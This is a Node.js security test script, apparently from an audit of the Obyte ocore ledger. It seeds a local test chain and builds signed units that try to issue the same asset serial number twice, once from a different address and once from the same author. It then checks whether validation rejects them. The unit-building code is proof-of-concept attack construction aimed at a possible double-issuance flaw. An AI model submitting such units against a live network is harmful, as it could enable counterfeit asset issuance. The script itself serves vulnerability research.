// E2-5 — issue spend proof reuse: duplicate serial issuance across addresses (empirical)
// Real path: validation.validate + writer.saveJoint for the ATTACK units (U2, U3);
// the asset definition + the first issue (U1) are seeded schema-exact (p2-lab convention:
// "ledger rows seeded directly; the code under test is 100% real pinned code").
// Pinned a7eb776. Q: can the same issue serial_number be issued twice via different authors
// (the F3-style address dodge), and is the same-author case actually caught?
"use strict";
const path = require("path");
const fs = require("fs");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const DATA = path.join(__dirname, ".e2-5data");
fs.rmSync(DATA, { recursive: true, force: true });
fs.mkdirSync(DATA, { recursive: true });

const desktop_app = require(O_CORE + "/desktop_app.js");
desktop_app.getAppRootDir = function () { return O_CORE; };
desktop_app.getAppDataDir = function () { return DATA; };

const crypto = require("crypto");
const ecdsa = require(O_CORE + "/node_modules/secp256k1");
const objectHash = require(O_CORE + "/object_hash.js");
const objectLength = require(O_CORE + "/object_length.js");
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function makeKey() {
  let priv; do { priv = crypto.randomBytes(32); } while (!ecdsa.privateKeyVerify(priv));
  const pub = Buffer.from(ecdsa.publicKeyCreate(priv, true));
  return { priv: priv.toString("hex"), pub: pub.toString("base64") };
}
const defOf = (k) => ["sig", { pubkey: k.pub }];
const addrOf = (k) => objectHash.getChash160(defOf(k));
function signHash(hashBuf, privHex) {
  return Buffer.from(ecdsa.ecdsaSign(hashBuf, Buffer.from(privHex, "hex")).signature).toString("base64");
}

module.exports = async function () { throw new Error("not a lab module"); };

async function main() {
  const KEYS = { W: makeKey(), A1: makeKey(), A2: makeKey() };
  const witness_addr = addrOf(KEYS.W);
  KEYS.W.addr = witness_addr; KEYS.A1.addr = addrOf(KEYS.A1); KEYS.A2.addr = addrOf(KEYS.A2);
  const TOTAL = 1e15;

  const constants = require(O_CORE + "/constants.js");
  constants.TOTAL_WHITEBYTES = TOTAL;
  constants.COUNT_WITNESSES = 1;
  constants.MAJORITY_OF_WITNESSES = 1;
  ["aa2UpgradeMci","aa3UpgradeMci","v4UpgradeMci","pemCurvesFixMci","noPrivateAssetsWithConditionsUpgradeMci",
   "timestampUpgradeMci","includeKeySizesUpgradeMci","lastBallStableInParentsUpgradeMci",
   "witnessedLevelMustNotRetreatUpgradeMci","witnessedLevelMustNotRetreatFromAllParentsUpgradeMci",
   "branchedMinMcWlUpgradeMci","altBranchByBestParentUpgradeMci","spendUnconfirmedUpgradeMci",
   "bestParentPrefersOpUpgradeMci","tpsFeeRecipientsFixMci","unstableInitialDefinitionUpgradeMci",
  ].forEach((k) => { constants[k] = 0; });

  // --- genesis (real path) ---
  const genesis = {
    version: "3.0",
    alt: "1",
    timestamp: Math.round(Date.now() / 1000),
    authors: [{ address: witness_addr, definition: defOf(KEYS.W), authentifiers: { r: "-" } }],
    messages: [],
    witnesses: [witness_addr],
    headers_commission: 0,
    payload_commission: 0,
  };
  const payload = {
    inputs: [{ type: "issue", amount: TOTAL, serial_number: 1 }],
    outputs: [
      { address: KEYS.A1.addr, amount: 0 },
      { address: KEYS.A2.addr, amount: 0 },
      { address: witness_addr, amount: 0 },
    ],
  };
  genesis.messages = [{ app: "payment", payload_location: "inline", payload, payload_hash: objectHash.getBase64Hash(payload, true) }];
  genesis.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(genesis), KEYS.W.priv);
  genesis.headers_commission = objectLength.getHeadersSize(genesis);
  genesis.payload_commission = objectLength.getTotalPayloadSize(genesis);
  const spendable = TOTAL - genesis.headers_commission - genesis.payload_commission;
  payload.outputs[0].amount = Math.floor(spendable * 0.4);
  payload.outputs[1].amount = Math.floor(spendable * 0.3);
  payload.outputs[2].amount = spendable - payload.outputs[0].amount - payload.outputs[1].amount;
  payload.outputs.sort((a, b) => (a.address < b.address ? -1 : 1));
  genesis.messages[0].payload_hash = objectHash.getBase64Hash(payload, true);
  genesis.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(genesis), KEYS.W.priv);
  genesis.unit = objectHash.getUnitHash(genesis);
  const genesisBall = objectHash.getBallHash(genesis.unit);
  constants.GENESIS_UNIT = genesis.unit;

  const db = require(O_CORE + "/db.js");
  const conf = require(O_CORE + "/conf.js");
  conf.bLight = false;
  await new Promise((resolve) => db.takeConnectionFromPool((conn) => { conn.query("SELECT 1", () => { conn.release(); resolve(); }); }));
  const q = (sql, params) => new Promise((resolve) => db.takeConnectionFromPool((conn) => {
    conn.query(sql, params || [], (rows) => { conn.release(); resolve(rows); });
  }));
  for (const [subject, value, mci] of [
    ["op_list", JSON.stringify([witness_addr]), -1],
    ["threshold_size", "10000", -1], ["base_tps_fee", "10", -1],
    ["tps_interval", "60", -1], ["tps_fee_multiplier", "10", -1],
  ]) await q("INSERT OR IGNORE INTO system_vars (subject, value, vote_count_mci) VALUES (?,?,?)", [subject, value, mci]);

  const storage = require(O_CORE + "/storage.js");
  require(O_CORE + "/network.js");
  const validation = require(O_CORE + "/validation.js");
  const writer = require(O_CORE + "/writer.js");
  for (let i = 0; i < 200 && typeof storage.getMinRetrievableMci() !== "number"; i++) await sleep(100);

  function makeSigner(key) {
    return {
      readDefinition: (conn, address, cb) => cb(null, defOf(key)),
      readSigningPaths: (conn, address, cb) => cb({ r: constants.SIG_LENGTH }),
      readPrivateKey: (address, path, cb) => cb(null, Buffer.from(key.priv, "hex")),
    };
  }
  function validateAndSave(joint, label) {
    return new Promise((resolve, reject) => {
      validation.validate(joint, {
        ifOk: (objValidationState, unlock) => {
          console.log("E2-5 " + label + " VALIDATION OK sequence=" + objValidationState.sequence);
          objValidationState.count_primary_aa_triggers = objValidationState.count_primary_aa_triggers || 0;
          writer.saveJoint(joint, objValidationState, null, () => { unlock(); resolve("saved"); });
        },
        ifUnitError: (e) => { console.log("E2-5 " + label + " UNIT-ERROR: " + e); reject(new Error(label + ": " + e)); },
        ifJointError: (e) => { console.log("E2-5 " + label + " JOINT-ERROR: " + e); reject(new Error(label + ": " + e)); },
        ifTransientError: (e) => { console.log("E2-5 " + label + " TRANSIENT: " + e); reject(new Error(label + ": " + e)); },
        ifNeedParentUnits: () => reject(new Error(label + ": need parents")),
        ifNeedHashTree: () => reject(new Error(label + ": need hash tree")),
      });
    });
  }

  // --- save genesis (real path) ---
  await validateAndSave({ unit: genesis, ball: genesisBall }, "GENESIS");
  await storage.initCaches();
  const gOut = await q("SELECT output_index, address, amount FROM outputs WHERE unit=? ORDER BY output_index", [genesis.unit]);
  const idxOf = (addr) => gOut.find((o) => o.address === addr).output_index;

  // addresses rows (inputsByAddress FK)
  await q("INSERT OR IGNORE INTO addresses (address) VALUES (?),(?)", [KEYS.A1.addr, KEYS.A2.addr]);

  // --- seed the ASSET (uncapped, not issued_by_definer_only) + its first issue U1 ---
  const assetHash = objectHash.getBase64Hash({ is_private: false, is_transferrable: true,
    auto_destroy: false, fixed_denominations: false, issued_by_definer_only: false,
    cosigned_by_definer: false, spender_attested: false });
  try { await q("INSERT OR IGNORE INTO units (unit, version, alt, timestamp, is_free, is_stable, is_on_main_chain, main_chain_index, level, sequence, witnessed_level, best_parent_unit, last_ball_unit, headers_commission, payload_commission, tps_fee) VALUES (?,?,?,?,0,1,1,0,1,'good',0,?,?,0,0,0)",
    [assetHash, "4.0", "1", Math.round(Date.now()/1000), genesis.unit, genesis.unit]);
       await q("INSERT OR IGNORE INTO unit_authors (unit, address) VALUES (?,?)", [assetHash, KEYS.A1.addr]); }
  catch (e) { console.log("E2-5 SEED-ERR asset-units: " + e.message); }
  try { await q("INSERT OR IGNORE INTO assets (unit, message_index, cap, is_private, is_transferrable, auto_destroy, fixed_denominations, issued_by_definer_only, cosigned_by_definer, spender_attested) VALUES (?,0,NULL,0,1,0,0,0,0,0)", [assetHash]); }
  catch (e) { console.log("E2-5 SEED-ERR assets: " + e.message); }
  try { await q("INSERT OR IGNORE INTO asset_denominations (asset, denomination, count_coins, max_issued_serial_number) VALUES (?,1,NULL,1)", [assetHash]); }
  catch (e) { console.log("E2-5 SEED-ERR asset_denominations: " + e.message); }
  // U1: the first issue of serial 1 to A1 (seeded as if saved)
  const u1Hash = objectHash.getBase64Hash({ seeded: "u1-issue", serial: 1, addr: KEYS.A1.addr });
  try { await q("INSERT OR IGNORE INTO units (unit, version, alt, timestamp, is_free, is_stable, is_on_main_chain, main_chain_index, level, sequence, witnessed_level, best_parent_unit, last_ball_unit, headers_commission, payload_commission, tps_fee) VALUES (?,?,?,?,1,0,0,NULL,1,'good',0,?,?,0,0,0)",
    [u1Hash, "4.0", "1", Math.round(Date.now()/1000), genesis.unit, genesis.unit]);
       await q("UPDATE units SET latest_included_mc_index=0 WHERE unit=?", [u1Hash]);
       await q("INSERT OR IGNORE INTO unit_authors (unit, address) VALUES (?,?)", [u1Hash, KEYS.A1.addr]); }
  catch (e) { console.log("E2-5 SEED-ERR u1-units: " + e.message); }
  try { await q("INSERT OR IGNORE INTO inputs (unit, message_index, input_index, asset, denomination, is_unique, type, serial_number, amount, address) VALUES (?,0,0,?,1,1,'issue',1,1000,?)", [u1Hash, assetHash, KEYS.A1.addr]); }
  catch (e) { console.log("E2-5 SEED-ERR u1-inputs: " + e.message); }
  try { await q("INSERT OR IGNORE INTO outputs (unit, message_index, output_index, asset, address, amount) VALUES (?,0,0,?,?,1000)", [u1Hash, assetHash, KEYS.A1.addr]); }
  catch (e) { console.log("E2-5 SEED-ERR u1-outputs: " + e.message); }
  // memory cache: the MC machinery reads parents from assocUnstableUnits (storage.js:1532)
  storage.assocUnstableUnits[u1Hash] = { unit: u1Hash, level: 1, latest_included_mc_index: 0,
    main_chain_index: null, latest_included_mc_index: 0, is_on_main_chain: 0, is_free: 1, is_stable: 0, witnessed_level: 0,
    sequence: "good", best_parent_unit: genesis.unit, last_ball_unit: genesis.unit,
    timestamp: Math.round(Date.now()/1000), author_addresses: [KEYS.A1.addr],
    headers_commission: 0, payload_commission: 0, tps_fee: 0, max_aa_responses: null,
    count_aa_responses: null, count_primary_aa_triggers: 0, bAA: false };
  console.log("E2-5 SEEDED asset=" + assetHash + " u1=" + u1Hash + " (A1 issue serial 1)");

  // --- the attack unit builder (real composer-style construction) ---
  function buildIssueUnit(key, serial, amount, label) {
    const anc = { parent_units: [genesis.unit], last_ball: genesisBall, last_ball_unit: genesis.unit };
    const issuePayload = {
      asset: assetHash,
      inputs: [{ type: "issue", amount, serial_number: serial }],
      outputs: [{ address: key.addr, amount }],
    };
    const messages = [{ app: "payment", payload_location: "inline", payload: issuePayload }];
    const baseInput = { unit: genesis.unit, message_index: 0, output_index: idxOf(key.addr) };
    const u = {
      version: "4.0", alt: "1", timestamp: Math.round(Date.now() / 1000),
      authors: [{ address: key.addr, definition: defOf(key), authentifiers: { r: "-" } }],
      parent_units: anc.parent_units, last_ball: anc.last_ball, last_ball_unit: anc.last_ball_unit,
      messages, headers_commission: 0, payload_commission: 0, tps_fee: 0,
    };
    // pay for base fees from the genesis base input
    messages.push({ app: "payment", payload_location: "inline", payload: { inputs: [baseInput], outputs: [{ address: key.addr, amount: 0 }] } });
    u.messages.forEach((m) => { m.payload_hash = objectHash.getBase64Hash(m.payload, true); });
    u.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(u), key.priv);
    u.headers_commission = objectLength.getHeadersSize(u);
    u.payload_commission = objectLength.getTotalPayloadSize(u);
    const baseAmount = gOut.find((o) => o.output_index === idxOf(key.addr)).amount;
    messages[messages.length - 1].payload.outputs[0].amount = baseAmount - u.headers_commission - u.payload_commission;
    u.messages.forEach((m) => { m.payload_hash = objectHash.getBase64Hash(m.payload, true); });
    u.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(u), key.priv);
    u.unit = objectHash.getUnitHash(u);
    return u;
  }

  // --- THE TEST: U2 = A2 issues serial 1 again (different author) ---
  const U2 = buildIssueUnit(KEYS.A2, 1, 1000, "U2-A2-issue-serial1");
  try { const r = await validateAndSave({ unit: U2 }, "U2-A2-issue-serial1"); console.log("E2-5 U2 OUTCOME: " + r); }
  catch (e) { console.log("E2-5 U2 OUTCOME: REJECTED — " + e.message); }

  // --- CONTROL: U3 = A1 issues serial 1 again (same author) ---
  const U3 = buildIssueUnit(KEYS.A1, 1, 1000, "U3-A1-issue-serial1-again");
  try { const r = await validateAndSave({ unit: U3 }, "U3-A1-issue-serial1-again"); console.log("E2-5 U3 OUTCOME: " + r); }
  catch (e) { console.log("E2-5 U3 OUTCOME: REJECTED — " + e.message); }

  // --- report DB state ---
  const issueRows = await q("SELECT unit, serial_number, amount, asset, address, is_unique FROM inputs WHERE type='issue' ORDER BY unit");
  console.log("E2-5 ISSUE-INPUTS-DB: " + JSON.stringify(issueRows));
  const dupRows = await q("SELECT asset, denomination, serial_number, address, COUNT(*) AS c FROM inputs WHERE type='issue' GROUP BY asset, denomination, serial_number, address HAVING c>1");
  console.log("E2-5 DUPLICATE-KEY-ROWS: " + JSON.stringify(dupRows));
  console.log("E2-5 DONE");
  process.exit(0);
}
main().catch((e) => { console.error("E2-5 FATAL", e); process.exit(1); });
